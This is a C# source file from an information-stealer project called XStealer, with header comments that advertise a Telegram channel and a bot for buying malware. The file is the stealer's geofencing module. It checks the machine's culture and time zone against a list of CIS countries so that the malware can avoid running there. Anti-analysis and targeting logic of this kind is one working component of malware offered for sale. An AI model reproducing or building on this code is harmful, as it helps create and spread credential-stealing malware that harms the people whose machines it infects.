// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.Globalization;

    public static class CheckContry
    {
        /// <summary>
        /// <br>Список стран, в которых запрещено запускать приложение</br>
        /// <br>List of countries in which it is prohibited to run the application</br>
        /// </summary>
        private static readonly string[] RegionsCountry = new string[]
        {
             "Armenia", "Azerbaijan", "Belarus", "Kazakhstan", "Kyrgyzstan",
             "Moldova", "Tajikistan", "Uzbekistan", "Ukraine", "Russia"
        };

        /// <summary>
        /// Method for checking time zone and country from the "RegionsCountry" list
        /// </summary>
        /// <returns>true or false</returns>
        public static bool Local
        {
            get
            {
                try
                {
                    string currentlanguage = CultureInfo.CurrentCulture?.ToString();
                    var regionlanguage = new RegionInfo(currentlanguage);
                    var localZone = TimeZoneInfo.Local;
                    foreach (string country in RegionsCountry)
                    {
                        if (country.Contains(regionlanguage.EnglishName) || localZone.Id.Contains(country))
                        {
                            return true;
                        }
                    }
                }
                catch { }
                return false;
            }
        }
    }
}